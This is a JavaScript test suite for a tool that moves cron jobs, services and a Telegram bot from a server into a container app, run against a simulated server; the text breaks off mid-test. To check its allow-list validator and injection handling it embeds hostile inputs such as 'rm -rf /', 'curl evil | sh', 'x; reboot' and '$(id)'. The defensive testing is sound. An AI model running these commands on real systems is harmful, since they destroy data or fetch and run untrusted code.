// move-in.test.mjs: /move-in against a made-up server (spec 2026-10-17 T3).
//   node --test engine/move-in/move-in.test.mjs
//
// Nothing here reaches a server. The "server" is a JS object holding a crontab
// and two services; it reads the scripts host-ops.mjs would send and answers
// the way bash would, without executing a single line. The container side is
// apply.mjs's own CLI entry point, run in-process against a scratch brain.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, existsSync, statSync, readdirSync, writeFileSync, mkdirSync, rmSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import path from 'node:path';
import { tmpDir } from '../../tests/tmp-dir.mjs';
import { makeBrain, inventory, has, CRON, BOT_TOKEN, CHAT_ID, LOGIN, fakeServer } from './test-fixture.mjs';
import { buildPlan, planNow } from './plan.mjs';
import { runCli, approve, applyStep, undoStep, show } from './apply.mjs';
import { readPlan, readInventory } from './store.mjs';
import { HOST_OPS, validateHostOp, sha256 } from './host-ops.mjs';
import { commentCronLine, uncommentCronLine, cronToSchedule, analyzeCommand, redact, readJobDefinition, settled, sentences, remoteReach, parseGitRemoteUrl, mineralRewrite, telegramNow } from './lib.mjs';
import { runHostStep, moveOut } from '../../wizard/panel/move-in-host.mjs';
import { appendRun } from '../lib/run-ledger.mjs';

const NOW = '2026-10-18T10:00:00.000Z';
const fresh = () => {
  const d = makeBrain(tmpDir('move-in-'));
  const r = planNow(d, { has, now: NOW });
  assert.ok(r.ok, r.error);
  return d;
};
const plan = (d) => readPlan(d);
const step = (d, id) => plan(d).steps.find((s) => s.id === id);
const container = (d) => async (args, stdin) => runCli([d, ...args], stdin);
// What Finish leaves: moving_in cleared (the after-Finish steps open then).
const finished = (d) => {
  const f = path.join(d, 'ownership.json');
  writeFileSync(f, JSON.stringify({ ...JSON.parse(readFileSync(f, 'utf8')), moving_in: false }, null, 2) + '\n');
};
const own = (d) => JSON.parse(readFileSync(path.join(d, 'ownership.json'), 'utf8'));

// Every file under the brain, as bytes, minus the plan's own files and the
// engine's private .kernel/move-in/ bookkeeping.
function tree(d) {
  const out = {};
  const walk = (rel) => {
    for (const e of readdirSync(path.join(d, rel), { withFileTypes: true })) {
      const r = rel ? `${rel}/${e.name}` : e.name;
      if (e.isDirectory()) { if (r !== '.kernel/move-in') walk(r); continue; }
      if (r === 'cockpit/move-in.json' || r === 'move-in.md') continue;
      out[r] = readFileSync(path.join(d, r)).toString('base64');
    }
  };
  walk('');
  return out;
}

// A successful run inside the mineral, as the scheduler would record it.
function ranOk(d, target, id) {
  if (target === 'scripts') appendRun(d, { job: `script:${id}`, script: id, skill: null, status: 'ok', summary: 'ok', tail: ['ok'] });
  else appendRun(d, { job: id, skill: id, status: 'ok', summary: 'ok' });
}

// ---------------------------------------------------------------------------------------

test('every item of the server inventory appears in the plan, and lands somewhere', () => {
  const d = fresh();
  const p = plan(d);
  const inv = inventory();
  const refs = p.items.map((i) => i.ref);
  const expect = inv.crontab.length + inv.units.length + inv.containers.length + inv.listeners.length
    + inv.skills.length + inv.lazy_skills.length + inv.hooks.length + inv.mcp_servers.length + inv.env_files.length;
  assert.equal(p.items.length, expect, 'one item per inventory entry');
  for (const u of inv.units) assert.ok(refs.includes(`unit:system:${u.name}`), u.name);
  for (const k of inv.containers) assert.ok(refs.includes(`container:${k.name}`), k.name);
  for (const n of inv.mcp_servers) assert.ok(refs.includes(`mcp:${n}`), n);
  const stepIds = new Set(p.steps.map((s) => s.id));
  const stillIds = new Set(p.still_on_server.map((s) => `still:${s.id}`));
  for (const it of p.items) {
    assert.ok(stepIds.has(it.to) || stillIds.has(it.to) || /^nothing:/.test(it.to), `${it.ref} -> ${it.to} points at nothing`);
  }
  // the two unrelated containers, the @reboot bridge, the tunnel and the ports stay on the server
  const still = p.still_on_server.map((x) => x.name);
  for (const n of ['cockpit', 'metabase', 'cloudflared.service', 'Open ports', 'Started when the server starts']) assert.ok(still.includes(n), n);
  assert.ok(existsSync(path.join(d, 'move-in.md')) && /## Still on the server/.test(readFileSync(path.join(d, 'move-in.md'), 'utf8')));
});

test('every Claude job becomes a DISABLED cadence entry with its schedule; a prompt that is not a skill becomes one', () => {
  const d = fresh();
  const p = plan(d);
  const cad = p.steps.filter((s) => s.kind === 'cadence-add');
  assert.deepEqual(cad.map((s) => s.job.id).sort(), ['email-watcher', 'morning', 'write-the-evening-digest']);
  for (const s of cad) assert.equal(s.job.entry.enabled, false, `${s.id} starts switched off`);
  const morning = cad.find((s) => s.job.id === 'morning');
  assert.equal(morning.job.skill, null, '"/morning" is the person\'s own skill, so no new one');
  assert.deepEqual(morning.job.entry.schedule, { kind: 'times', days: [], times: ['07:00'] });
  assert.match(morning.why, /--dangerously-skip-permissions/, 'the options it drops are named');
  const digest = cad.find((s) => s.job.id === 'write-the-evening-digest');
  assert.match(digest.job.skill.text, /Write the evening digest from today's notes/);
  assert.deepEqual(digest.job.entry.schedule.days, ['mon', 'tue', 'wed', 'thu', 'fri']);
  const ew = cad.find((s) => s.job.id === 'email-watcher');
  assert.match(ew.why, /job runner/);
  assert.match(ew.job.skill.text, /Check the inbox for anything urgent/, 'the runner\'s prompt, word for word');
  assert.equal(ew.job.entry.schedule.times.length, 24, 'hourly at :10, all 24 times');
  // applied: the entry is in cadence.json, switched off, and the skill exists
  approve(d, ['cadence-write-the-evening-digest']);
  applyStep(d, 'cadence-write-the-evening-digest');
  const c = JSON.parse(readFileSync(path.join(d, 'cockpit', 'cadence.json'), 'utf8'));
  assert.equal(c.version, 2);
  assert.equal(c.jobs['write-the-evening-digest'].enabled, false);
  assert.ok(existsSync(path.join(d, '.claude', 'skills', 'write-the-evening-digest', 'SKILL.md')));
});

test('every script becomes a DISABLED Scripts row, or "still on the server" when its program is host-only', () => {
  const d = fresh();
  const p = plan(d);
  const rows = Object.fromEntries(p.steps.filter((s) => s.kind === 'script-add').map((s) => [s.job.id, s.job.entry]));
  assert.deepEqual(Object.keys(rows).sort(), ['backup', 'brief-card', 'disk-guard', 'evening-check', 'money-state', 'nightly-tidy', 'nightly-tidy-2', 'standup', 'weekly']);
  for (const [id, e] of Object.entries(rows)) {
    assert.equal(e.enabled, false, id);
    assert.ok(Array.isArray(e.argv) && e.argv.length, `${id}: argv is an array`);
    assert.ok(e.cwd.startsWith(d), `${id}: runs inside the brain`);
  }
  assert.deepEqual(rows['money-state'].argv, ['node', path.join(d, 'cockpit/tools/money-state.mjs')], 'the server\'s nvm node becomes the mineral\'s node, path mapped onto /state');
  assert.deepEqual(rows['money-state'].schedule, { kind: 'every', minutes: 5, quiet: false });
  assert.equal(rows['money-state'].description, 'Rebuilds money.json from the bank export', 'described from its own header comment');
  assert.deepEqual(rows['brief-card'].argv, ['node', path.join(d, 'cockpit/run-job.mjs'), 'brief-card'], 'a runner job with no prompt is a script');
  assert.equal(rows['disk-guard'].argv[0], 'bash', 'a pipe is carried as one bash command');
  assert.match(p.steps.find((s) => s.id === 'script-disk-guard').why, /pipes/);
  assert.match(p.steps.find((s) => s.id === 'cutover-script-backup').why, /restored as a test/);
  const gws = p.still_on_server.find((x) => /gws-watchdog/.test(x.what));
  assert.ok(gws, 'a Go binary that only exists on the server stays there');
  assert.match(gws.why, /only on your server/);
  // a credential inline in a cron line never reaches the tracked Scripts file
  const inv = inventory();
  inv.crontab.push({ user: LOGIN, line_no: 99, text: `0 1 * * * cd /home/fixture/brain && API_TOKEN=s3cr3tvalue node cockpit/tools/money-state.mjs` });
  const p2 = buildPlan(d, inv, { has, now: NOW });
  const leaked = JSON.stringify(p2).includes('s3cr3tvalue');
  assert.equal(leaked, false, 'the token is nowhere in the plan');
  assert.ok(p2.still_on_server.some((x) => /password or token/.test(x.why)));
});

test('Telegram: the token and chat are carried over (0600), and the bot stays answered by the host program', () => {
  const d = fresh();
  const p = plan(d);
  assert.equal(p.telegram.answered_by, 'host');
  const carry = p.steps.find((s) => s.id === 'telegram-carry');
  const cut = p.steps.find((s) => s.id === 'telegram-cutover');
  assert.equal(carry.side, 'container');
  assert.equal(cut.side, 'host', 'who answers is a separate, later step');
  assert.equal(cut.after, 'telegram-carry');
  assert.deepEqual(cut.host_op, { op: 'unit-disable', name: 'telegram-chat.service', scope: 'system' });
  assert.match(cut.why, /voice notes/, 'the feature gap is listed');
  assert.ok(!JSON.stringify(p).includes(BOT_TOKEN), 'the token is not in the plan');
  approve(d, ['telegram-carry']);
  applyStep(d, 'telegram-carry');
  const tok = path.join(d, 'secrets', 'telegram_bot_token');
  assert.equal(readFileSync(tok, 'utf8'), BOT_TOKEN);
  assert.equal(readFileSync(path.join(d, 'secrets', 'telegram_chat_id'), 'utf8'), CHAT_ID);
  assert.equal(statSync(tok).mode & 0o777, 0o600);
  assert.equal(readFileSync(path.join(d, '.kernel', 'telegram-reader'), 'utf8'), 'host\n', 'Crads-AI must not long-poll the bot');
  const after = plan(d);
  assert.equal(after.telegram.carried, true);
  assert.equal(after.telegram.answered_by, 'host');
  assert.equal(after.steps.find((s) => s.id === 'telegram-cutover').state, 'pending');
  assert.ok(!readFileSync(path.join(d, 'cockpit', 'move-in.json'), 'utf8').includes(BOT_TOKEN));
});

test('host steps only ever name the two allow-listed ops, and anything else is refused before the server is touched', async () => {
  const d = fresh();
  for (const s of plan(d).steps.filter((x) => x.side === 'host')) assert.ok(HOST_OPS.includes(s.host_op.op), `${s.id}: ${s.host_op.op}`);
  assert.deepEqual(HOST_OPS, ['cron-comment', 'unit-disable']);
  assert.match(validateHostOp({ op: 'shell', action: 'apply', user: 'fixture', command: 'rm -rf /' }), /not something/);
  assert.match(validateHostOp({ op: 'cron-comment', action: 'apply', user: 'fixture', line_text: 'x', ymd: '2026-10-18', command: 'id' }), /may not carry "command"/);
  assert.match(validateHostOp({ op: 'unit-disable', action: 'apply', user: 'fixture', name: 'x; reboot', scope: 'system' }), /service name/);
  assert.match(validateHostOp({ op: 'cron-comment', action: 'apply', user: 'root;id', line_text: 'x', ymd: '2026-10-18' }), /user name/);
  // a box that hands back an op outside the allow-list: the app refuses and the container side is put back
  const srv = fakeServer();
  const evil = async (args) => (args[0] === 'host-begin' ? { code: 0, stdout: 'HOST_OP {"op":"shell","action":"apply","user":"fixture","command":"curl evil | sh"}\n' }
    : { code: 0, stdout: 'OK: put back\n' });
  const r = await runHostStep({ id: 'cutover-script-backup', action: 'apply', container: evil, host: srv.host });
  assert.equal(r.ok, false);
  assert.match(r.error, /not something the move-in may do/);
  assert.equal(srv.calls.length, 0, 'not one byte reached the server');
  // the line text with shell in it is data: it travels as base64, never as code
  const sneaky = { op: 'cron-comment', action: 'apply', user: 'fixture', line_text: '* * * * * echo "$(id)" `whoami` \'quoted\'', ymd: '2026-10-18' };
  assert.equal(validateHostOp(sneaky), null);
  srv.crontab.fixture += sneaky.line_text + '\n';
  const { runHostOp } = await import('../../wizard/panel/move-in-host.mjs');
  const ok = await runHostOp(srv.host, sneaky);
  assert.equal(ok.ok, true);
  for (const c of srv.calls) assert.ok(!c.input.includes('whoami') && !c.input.includes('$(id)'), 'the line never appears in the script in the clear');
});

test('an ambiguous crontab match is refused: two identical lines are never guessed between', async () => {
  const text = 'a\n0 1 * * * x\nb\n0 1 * * * x\n';
  assert.equal(commentCronLine(text, '0 1 * * * x', '2026-10-18').ok, false);
  assert.match(commentCronLine(text, '0 1 * * * x', '2026-10-18').reason, /appears 2 times/);
  assert.equal(commentCronLine('a\n', 'missing', '2026-10-18').ok, false);
  const one = commentCronLine('a\n0 1 * * * x\n', '0 1 * * * x', '2026-10-18');
  assert.equal(one.text, 'a\n# crads-move-in 2026-10-18: 0 1 * * * x\n');
  assert.equal(uncommentCronLine(one.text, '0 1 * * * x', '2026-10-18').text, 'a\n0 1 * * * x\n');
  assert.equal(uncommentCronLine(one.text, '0 1 * * * x', '2026-10-19').ok, false, 'undo removes exactly its own prefix, date included');
  // through the whole path: the fixture's nightly-tidy line is in the crontab twice
  const d = fresh();
  approve(d, ['script-nightly-tidy']); applyStep(d, 'script-nightly-tidy');
  ranOk(d, 'scripts', 'nightly-tidy');
  approve(d, ['cutover-script-nightly-tidy']);
  const srv = fakeServer();
  const before = srv.crontab.fixture;
  const r = await runHostStep({ id: 'cutover-script-nightly-tidy', action: 'apply', container: container(d), host: srv.host });
  assert.equal(r.ok, false);
  assert.match(r.error, /more than once/);
  assert.equal(srv.crontab.fixture, before, 'the crontab is untouched');
  assert.equal(srv.calls.length, 0);
  const s = step(d, 'cutover-script-nightly-tidy');
  assert.equal(s.state, 'approved');
  assert.ok(!s.in_flight);
  assert.equal(JSON.parse(readFileSync(path.join(d, 'cockpit', 'scripts.json'), 'utf8')).scripts['nightly-tidy'].enabled, false, 'the Crads-AI copy was not left switched on');
});

test('each container step\'s undo restores the exact prior bytes', () => {
  const d = fresh();
  // something already in cadence.json and scripts.json, in the person's own formatting
  writeFileSync(path.join(d, 'cockpit', 'cadence.json'), '{"version":2,"jobs":{"daily":{"enabled":true,"schedule":{"kind":"times","days":[],"times":["06:00"]}}}}');
  writeFileSync(path.join(d, 'cockpit', 'scripts.json'), '{ "version": 1, "scripts": {} }');
  planNow(d, { has, now: NOW });
  const ids = plan(d).steps.filter((s) => s.side === 'container').map((s) => s.id);
  assert.ok(ids.includes('gitignore') && ids.includes('telegram-carry') && ids.includes('script-money-state') && ids.includes('cadence-morning'));
  for (const id of ids) {
    const before = tree(d);
    approve(d, [id]);
    applyStep(d, id);
    if (step(d, id).kind !== 'note') assert.notDeepEqual(tree(d), before, `${id} changed something`);
    undoStep(d, id);
    assert.deepEqual(tree(d), before, `${id}: undo put every byte back`);
    assert.equal(step(d, id).state, 'undone');
  }
  // changed by the person after the step: schedule files fall back to taking out only what the step added
  approve(d, ['script-money-state']); applyStep(d, 'script-money-state');
  const f = path.join(d, 'cockpit', 'scripts.json');
  const j = JSON.parse(readFileSync(f, 'utf8')); j.scripts.mine = { enabled: false, argv: ['true'], cwd: d, schedule: { kind: 'every', minutes: 5 } };
  writeFileSync(f, JSON.stringify(j));
  undoStep(d, 'script-money-state');
  const k = JSON.parse(readFileSync(f, 'utf8'));
  assert.ok(k.scripts.mine && !k.scripts['money-state'], 'their row stays, ours goes');
  // anything else changed since is refused, and left alone
  approve(d, ['gitignore']); applyStep(d, 'gitignore');
  writeFileSync(path.join(d, '.gitignore'), 'their own edit\n');
  assert.throws(() => undoStep(d, 'gitignore'), /changed since/);
  assert.equal(readFileSync(path.join(d, '.gitignore'), 'utf8'), 'their own edit\n');
});

test('cutover: the Crads-AI copy must have run once, then it is switched on and the exact line commented; undo reverses (c) then (a)', async () => {
  const d = fresh();
  const srv = fakeServer();
  const original = srv.crontab.fixture;
  approve(d, ['script-money-state', 'cutover-script-money-state']);
  const early = await runHostStep({ id: 'cutover-script-money-state', action: 'apply', container: container(d), host: srv.host });
  assert.equal(early.ok, false);
  assert.match(early.error, /has to be done first/);
  applyStep(d, 'script-money-state');
  const noRun = await runHostStep({ id: 'cutover-script-money-state', action: 'apply', container: container(d), host: srv.host });
  assert.match(noRun.error, /Run money-state once/);
  assert.equal(srv.calls.length, 0);
  ranOk(d, 'scripts', 'money-state');
  const r = await runHostStep({ id: 'cutover-script-money-state', action: 'apply', container: container(d), host: srv.host });
  assert.equal(r.ok, true, r.error);
  const line = CRON.find((l) => l.includes('money-state'));
  assert.ok(srv.crontab.fixture.includes(`# crads-move-in 2026-10-18: ${line}`) || /# crads-move-in \d{4}-\d{2}-\d{2}: /.test(srv.crontab.fixture));
  assert.equal(srv.crontab.fixture.split('\n').filter((l) => l.startsWith('# crads-move-in')).length, 1, 'exactly one line changed');
  assert.equal(JSON.parse(readFileSync(path.join(d, 'cockpit', 'scripts.json'), 'utf8')).scripts['money-state'].enabled, true);
  assert.equal(step(d, 'cutover-script-money-state').state, 'done');
  const u = await runHostStep({ id: 'cutover-script-money-state', action: 'undo', container: container(d), host: srv.host });
  assert.equal(u.ok, true, u.error);
  assert.equal(srv.crontab.fixture, original, 'the crontab is byte-for-byte what it was');
  assert.equal(JSON.parse(readFileSync(path.join(d, 'cockpit', 'scripts.json'), 'utf8')).scripts['money-state'].enabled, false);
  // the server refusing the write puts the Crads-AI side back
  approve(d, ['cutover-script-money-state']);
  const busy = fakeServer();
  const ssh0 = busy.host.ssh;
  busy.host.ssh = async (c, i) => { if (/crontab -u "\$U" -/.test(i)) busy.crontab.fixture += '# someone else\n'; return ssh0(c, i); };
  const lost = await runHostStep({ id: 'cutover-script-money-state', action: 'apply', container: container(d), host: busy.host });
  assert.equal(lost.ok, false);
  assert.match(lost.error, /changed while the app was reading/);
  assert.equal(JSON.parse(readFileSync(path.join(d, 'cockpit', 'scripts.json'), 'utf8')).scripts['money-state'].enabled, false, 'one owner: the copy that did not take over is off again');
});

test('Telegram cutover: the host program stops first, then Crads-AI reads the bot; undo stops Crads-AI first, then restores the unit', async () => {
  const d = fresh();
  const srv = fakeServer();
  approve(d, ['telegram-carry', 'telegram-cutover']);
  applyStep(d, 'telegram-carry');
  finished(d);
  const r = await runHostStep({ id: 'telegram-cutover', action: 'apply', container: container(d), host: srv.host });
  assert.equal(r.ok, true, r.error);
  assert.deepEqual(srv.units['telegram-chat.service'], { enabled: 'disabled', active: 'inactive' });
  assert.ok(!existsSync(path.join(d, '.kernel', 'telegram-reader')), 'the marker is gone: Crads-AI answers');
  assert.equal(plan(d).telegram.answered_by, 'crads');
  const u = await runHostStep({ id: 'telegram-cutover', action: 'undo', container: container(d), host: srv.host });
  assert.equal(u.ok, true, u.error);
  assert.deepEqual(srv.units['telegram-chat.service'], { enabled: 'enabled', active: 'active' }, 'back to exactly how it was');
  assert.equal(readFileSync(path.join(d, '.kernel', 'telegram-reader'), 'utf8'), 'host\n');
  assert.equal(plan(d).telegram.answered_by, 'host');
});

test('Move out reverses every done step newest first, server and mineral, then calls the teardown LAST', async () => {
  const d = fresh();
  const before = tree(d);
  const srv = fakeServer();
  const original = srv.crontab.fixture;
  const order = [];
  approve(d, ['gitignore', 'script-money-state', 'cutover-script-money-state', 'telegram-carry', 'telegram-cutover', 'cadence-write-the-evening-digest', 'note-skills']);
  for (const id of ['gitignore', 'script-money-state', 'telegram-carry', 'cadence-write-the-evening-digest', 'note-skills']) applyStep(d, id);
  ranOk(d, 'scripts', 'money-state');
  assert.equal((await runHostStep({ id: 'cutover-script-money-state', action: 'apply', container: container(d), host: srv.host })).ok, true);
  finished(d);   // Telegram's switch-over only opens after Finish
  assert.equal((await runHostStep({ id: 'telegram-cutover', action: 'apply', container: container(d), host: srv.host })).ok, true);
  const c = container(d);
  const calls = [];
  const spy = async (args, stdin) => { calls.push(args[0]); if (args[0] === 'undo' || (args[0] === 'host-begin' && args[2] === 'undo')) order.push(args[1]); return c(args, stdin); };
  const doneOrder = plan(d).steps.filter((s) => s.state === 'done').sort((a, b) => b.done_seq - a.done_seq).map((s) => s.id);
  let torn = null;
  const r = await moveOut({ container: spy, host: srv.host, brainRoot: '/home/fixture/brain', teardown: async (h, o) => { torn = { at: order.length, o, h }; } });
  assert.equal(r.ok, true, r.error);
  assert.equal(calls[0], 'move-out-begin', 'everything is held before anything is reversed or stopped');
  assert.deepEqual(order, doneOrder, 'newest first');
  assert.equal(torn.at, doneOrder.length, 'the teardown runs after every step is reversed');
  assert.deepEqual(torn.o, { brainRoot: '/home/fixture/brain' });
  assert.equal(torn.h, srv.host, 'with the same server connection');
  assert.equal(srv.crontab.fixture, original);
  assert.deepEqual(srv.units['telegram-chat.service'], { enabled: 'enabled', active: 'active' });
  // the brain is as it was, apart from the plan's own files (and the run ledger the test wrote),
  // and ownership.json, which now holds every committer for the container stop
  const now = tree(d);
  for (const k of Object.keys(now)) if (/^cockpit\/(run-ledger\.jsonl|last-script-runs\.json)$/.test(k)) delete now[k];
  delete now['ownership.json']; delete before['ownership.json'];
  assert.deepEqual(now, before);
  assert.deepEqual(own(d), { mineral_id: 'min_0123456789abcdef01234567', adopted: true, moving_in: true, moving_out: true });
  assert.ok(r.kept.some((k) => k.file === 'cockpit/move-in.json') && r.kept.some((k) => k.file === 'move-in.md'), 'it names what stays in the folder');
  assert.deepEqual(r.commits, [], 'no git repository here, so no commits to list');
  // a step that will not reverse stops Move out BEFORE the teardown
  const d2 = fresh();
  approve(d2, ['gitignore']); applyStep(d2, 'gitignore');
  writeFileSync(path.join(d2, '.gitignore'), 'edited by the person\n');
  let called = false;
  const r2 = await moveOut({ container: container(d2), host: fakeServer().host, brainRoot: '/x', teardown: async () => { called = true; } });
  assert.equal(r2.ok, false);
  assert.equal(r2.stopped_at, 'gitignore');
  assert.equal(called, false, 'never strip the server while a step is still in place');
  // a teardown that could not undo everything is reported in words, not as moved out
  const d3 = fresh();
  const r3 = await moveOut({ container: container(d3), host: fakeServer().host, brainRoot: '/home/fixture/brain',
    teardown: async () => ({ ok: false, undone: ['the member login'], kept: [], skipped: [], failed: ['the ai-os service'], recordRemoved: false }) });
  assert.equal(r3.ok, false);
  assert.match(r3.error, /could not undo: the ai-os service/);
  const r4 = await moveOut({ container: container(d3), host: fakeServer().host, brainRoot: '~/brain', teardown: async () => { throw new Error('should not run'); } });
  assert.equal(r4.ok, false, 'a brain folder that is not an absolute host path never reaches the teardown');
});

test('finishing: only when every step is done or skipped, and it clears moving_in keeping every other key', () => {
  const d = fresh();
  const r = runCli([d, 'finish']);
  assert.equal(r.code, 1);
  assert.match(r.stdout, /not done or skipped yet/);
  for (const s of plan(d).steps) runCli([d, 'skip', s.id]);
  const ok = runCli([d, 'finish']);
  assert.equal(ok.code, 0, ok.stdout);
  const own = JSON.parse(readFileSync(path.join(d, 'ownership.json'), 'utf8'));
  assert.equal(own.moving_in, false);
  assert.equal(own.adopted, true);
  assert.equal(own.mineral_id, 'min_0123456789abcdef01234567');
});

test('re-planning keeps every decided step and its state', () => {
  const d = fresh();
  approve(d, ['gitignore']); applyStep(d, 'gitignore');
  runCli([d, 'skip', 'note-git']);
  planNow(d, { has, now: '2026-10-19T10:00:00.000Z' });
  assert.equal(step(d, 'gitignore').state, 'done');
  assert.equal(step(d, 'note-git').state, 'skipped');
  assert.equal(step(d, 'cadence-morning').state, 'pending');
  assert.deepEqual(plan(d).steps.map((s) => s.id).filter((v, i, a) => a.indexOf(v) !== i), [], 'no duplicate step ids');
});

test('the planner pieces: schedules, commands, the job runner and redaction', () => {
  assert.deepEqual(cronToSchedule(['*/15', '*', '*', '*', '*'], { floor: 1 }).schedule, { kind: 'every', minutes: 15, quiet: false });
  const sk = cronToSchedule(['*/15', '*', '*', '*', '*'], { floor: 30 });
  assert.equal(sk.exact, false); assert.equal(sk.schedule.minutes, 30); assert.match(sk.note, /every 30/);
  assert.deepEqual(cronToSchedule(['0', '9', '*', '*', '1,3'], {}).schedule, { kind: 'times', days: ['mon', 'wed'], times: ['09:00'] });
  const monthly = cronToSchedule(['0', '4', '1', '*', '*'], { todayYmd: '2026-10-18' });
  assert.equal(monthly.exact, false); assert.equal(monthly.schedule.kind, 'every-days'); assert.equal(monthly.schedule.anchor, '2026-11-01');
  const a = analyzeCommand('cd /home/u/b && FOO=1 node x.mjs --flag >> log 2>&1', { login: 'u' });
  assert.equal(a.simple, true); assert.equal(a.cwdHost, '/home/u/b'); assert.deepEqual(a.env, ['FOO=1']); assert.deepEqual(a.argv, ['node', 'x.mjs', '--flag']);
  assert.equal(analyzeCommand('claude -p "do the thing" --model opus').claude.prompt, 'do the thing');
  assert.equal(analyzeCommand('node run.mjs "$(date)"').simple, false, 'a shell expansion is not argv');
  assert.equal(readJobDefinition('{"jobs":{"a":{"prompt":"hi"}}}', 'jobs.json', 'a').claude, true);
  assert.equal(readJobDefinition('{"jobs":{"a":{"cmd":"x"}}}', 'jobs.json', 'a').claude, false);
  assert.equal(readJobDefinition('export default [{ name: "z", prompt: `built ${x}` }]', 'jobs.mjs', 'z').prompt, null, 'a prompt built at run time is not copied');
  assert.equal(readJobDefinition('nothing here', 'jobs.js', 'q').found, false, 'unreadable = a script, conservatively');
  assert.equal(redact('A_TOKEN=abc123 node x'), 'A_TOKEN=<hidden> node x');
  assert.equal(redact(`curl -H x ${'ab12'.repeat(10)}`), 'curl -H x <hidden>');
  assert.equal(redact('node /home/fixture/brain/cockpit/tools/a-very-long-script-name-for-testing.mjs'), 'node /home/fixture/brain/cockpit/tools/a-very-long-script-name-for-testing.mjs', 'a path is not a secret');
});

test('the move-in skill installs only on an adopted brain, and tells Claude never to touch the host', async () => {
  const { syncSkills } = await import('../kernel/lib/skills.mjs');
  const engine = path.resolve(path.dirname(new URL(import.meta.url).pathname), '..', 'skills');
  const pebble = tmpDir('mi-pebble-');
  await syncSkills(pebble, engine, { adopted: false });
  assert.equal(existsSync(path.join(pebble, '.claude', 'skills', 'move-in')), false);
  const adopted = tmpDir('mi-adopted-');
  mkdirSync(path.join(adopted, '.claude', 'skills', 'daily'), { recursive: true });
  writeFileSync(path.join(adopted, '.claude', 'skills', 'daily', 'SKILL.md'), 'SENTINEL\n');
  await syncSkills(adopted, engine, { adopted: true });
  assert.ok(existsSync(path.join(adopted, '.claude', 'skills', 'move-in', 'SKILL.md')), 'move-in clashes with nothing');
  const md = readFileSync(path.join(engine, 'move-in.md'), 'utf8');
  assert.match(md, /never touch the server directly/i);
  assert.match(md, /plan\.mjs \/state/);
  assert.match(md, /apply\.mjs \/state apply/);
  assert.doesNotMatch(md, /\u2014/);
});

test('nothing the planner writes under cockpit/ carries a raw crontab line', () => {
  const d = fresh();
  const j = readFileSync(path.join(d, 'cockpit', 'move-in.json'), 'utf8');
  const inv = readInventory(d);
  const shown = JSON.parse(j).items.map((i) => i.display);
  assert.equal(shown.length > 0, true);
  // host steps point at the inventory by hash, never by text
  for (const s of JSON.parse(j).steps.filter((x) => x.side === 'host' && x.host_op.op === 'cron-comment')) {
    assert.ok(/^[0-9a-f]{64}$/.test(s.host_op.text_sha256));
    assert.ok(inv.crontab.some((r) => sha256(r.text) === s.host_op.text_sha256));
    assert.equal(s.host_op.line_text, undefined);
  }
});

// ---- a server step the app stopped half way through ---------------------------------------
// The app does host-begin, the server op, host-end. These pin each place it can
// die: before the server op and after it, on the way in and on the way back.
import { checkHostStep, resolveHostStep, runHostOp } from '../../wizard/panel/move-in-host.mjs';

const writes = (srv) => srv.calls.filter((c) => /crontab -u "\$U" -|echo "PRIOR|sysd enable|sysd start/.test(c.input)).length;
const enabledRow = (d) => JSON.parse(readFileSync(path.join(d, 'cockpit', 'scripts.json'), 'utf8')).scripts['money-state'].enabled;

function readyCutover() {
  const d = fresh();
  approve(d, ['script-money-state', 'cutover-script-money-state']);
  applyStep(d, 'script-money-state');
  ranOk(d, 'scripts', 'money-state');
  return d;
}
const begin = (d, id, action) => {
  const r = runCli([d, 'host-begin', id, action]);
  assert.equal(r.code, 0, r.stdout);
  return JSON.parse(r.stdout.match(/^HOST_OP (.*)$/m)[1]);
};

test('half done, the app died BEFORE the server op: the check says unchanged, and both ways out work', async () => {
  const d = readyCutover();
  const srv = fakeServer();
  const original = srv.crontab.fixture;
  begin(d, 'cutover-script-money-state', 'apply');
  assert.equal(step(d, 'cutover-script-money-state').in_flight, 'apply');
  assert.equal(enabledRow(d), true, 'the Crads-AI half had already happened');
  assert.match(runCli([d, 'host-begin', 'cutover-script-money-state', 'apply']).stdout, /part-way through/, 'a plain retry is refused');
  const c = await checkHostStep({ id: 'cutover-script-money-state', container: container(d), host: srv.host });
  assert.equal(c.ok, true, c.error);
  assert.equal(c.check.server, 'unchanged');
  assert.deepEqual(c.check.choices.map((x) => x.choice), ['finish', 'rollback']);
  assert.equal(writes(srv), 0, 'a check writes nothing');
  assert.equal(step(d, 'cutover-script-money-state').check.server, 'unchanged', 'the page renders it from the plan');
  // roll back: no server op at all, the Crads-AI copy is off again, the step waits for another try
  const rb = await resolveHostStep({ id: 'cutover-script-money-state', choice: 'rollback', container: container(d), host: srv.host });
  assert.equal(rb.ok, true, rb.error);
  assert.equal(writes(srv), 0);
  assert.equal(srv.crontab.fixture, original);
  assert.equal(enabledRow(d), false);
  const s1 = step(d, 'cutover-script-money-state');
  assert.equal(s1.state, 'approved'); assert.equal(s1.in_flight, undefined); assert.equal(s1.check, undefined);
  // die again in the same place, then finish: the one apply op runs and the step is done
  begin(d, 'cutover-script-money-state', 'apply');
  const fin = await resolveHostStep({ id: 'cutover-script-money-state', choice: 'finish', container: container(d), host: srv.host });
  assert.equal(fin.ok, true, fin.error);
  assert.equal(srv.crontab.fixture.split('\n').filter((l) => l.startsWith('# crads-move-in ')).length, 1);
  assert.equal(step(d, 'cutover-script-money-state').state, 'done');
  assert.equal(enabledRow(d), true);
  // and the ordinary undo still restores the exact bytes
  const u = await runHostStep({ id: 'cutover-script-money-state', action: 'undo', container: container(d), host: srv.host });
  assert.equal(u.ok, true, u.error);
  assert.equal(srv.crontab.fixture, original);
});

test('half done, the app died AFTER the server op: the check says changed; finish needs no op, rollback runs the undo op', async () => {
  const d = readyCutover();
  const srv = fakeServer();
  const original = srv.crontab.fixture;
  const op = begin(d, 'cutover-script-money-state', 'apply');
  assert.equal((await runHostOp(srv.host, op)).ok, true);   // the server half landed; host-end never ran
  const c = await checkHostStep({ id: 'cutover-script-money-state', container: container(d), host: srv.host });
  assert.equal(c.check.server, 'changed');
  const before = writes(srv);
  const fin = await resolveHostStep({ id: 'cutover-script-money-state', choice: 'finish', container: container(d), host: srv.host });
  assert.equal(fin.ok, true, fin.error);
  assert.equal(writes(srv), before, 'finishing writes nothing more to the server');
  const s = step(d, 'cutover-script-money-state');
  assert.equal(s.state, 'done');
  assert.equal(s.result.ymd, op.ymd, 'the date on the line is kept, so undo finds exactly its prefix');
  assert.equal((await runHostStep({ id: 'cutover-script-money-state', action: 'undo', container: container(d), host: srv.host })).ok, true);
  assert.equal(srv.crontab.fixture, original);
  // the same death, rolled back instead
